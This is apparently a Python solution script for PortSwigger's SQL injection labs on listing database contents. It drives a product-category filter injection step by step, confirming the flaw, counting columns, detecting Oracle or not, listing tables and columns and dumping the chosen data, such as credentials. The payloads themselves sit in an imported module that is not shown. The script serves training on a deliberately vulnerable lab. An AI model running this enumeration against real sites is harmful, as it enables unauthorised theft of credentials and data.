# Lab 05 & 06 — SQL Injection: Listing Database Contents
# PortSwigger (Lab 05): https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
# PortSwigger (Lab 06): https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
#
# Vulnerability: Product category filter
# Aim:           Enumerate tables → columns → dump credentials, then log in as administrator
#
# Steps:
#   1. Confirm SQLi
#   2. Count columns
#   3. Detect DB type (Oracle vs non-Oracle determines which catalog to query)
#   4. List all tables via information_schema (non-Oracle) or all_tables (Oracle)
#   5. List columns for a chosen table
#   6. Dump selected columns
#
# Usage: python lab5_6.py <url>

import sys
import urllib3
from sqli_utils import (
    check_vulnerability, banner, section,
    get_number_of_columns, detect_db_type,
    list_tables, list_columns, dump_table,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_PATH = "filter"


def run(target):
    """
    Full enumeration flow: tables → columns → data dump.
    Exposed as a function so lab9.py and lab10.py can import and call it
    directly instead of spawning a subprocess.
    """
    if not check_vulnerability(target, FILTER_PATH):
        print("\n  ✘  Target does not appear vulnerable. Exiting.")
        sys.exit(1)

    col_num = get_number_of_columns(target, FILTER_PATH)
    if col_num is None:
        print("\n  ✘  Could not determine column count. Exiting.")
        sys.exit(1)

    db_type = detect_db_type(target, col_num, FILTER_PATH)
    # Normalise to the key used in TABLE_QUERIES / COLUMN_QUERIES
    db_key = "oracle" if db_type == "Oracle" else "non-oracle"

    tables = list_tables(target, col_num, db_key)
    if not tables:
        sys.exit(1)

    print()
    target_table = input("  ➜  Enter table name to inspect: ").strip()

    columns = list_columns(target, col_num, db_key, target_table)
    if not columns:
        sys.exit(1)

    print(f"\n  Available columns: {', '.join(columns)}")
    selected = input(f"  ➜  Columns to dump (comma-separated, Enter = all): ").strip()
    chosen = [c.strip() for c in selected.split(",")] if selected else columns

    dump_table(target, col_num, target_table, chosen)


if __name__ == "__main__":
    banner()
    section("LAB 05 & 06 — LISTING DATABASE CONTENTS")

    if len(sys.argv) != 2:
        print("  Usage: python lab5_6.py <url>")
        sys.exit(1)

    run(sys.argv[1].rstrip("/") + "/")
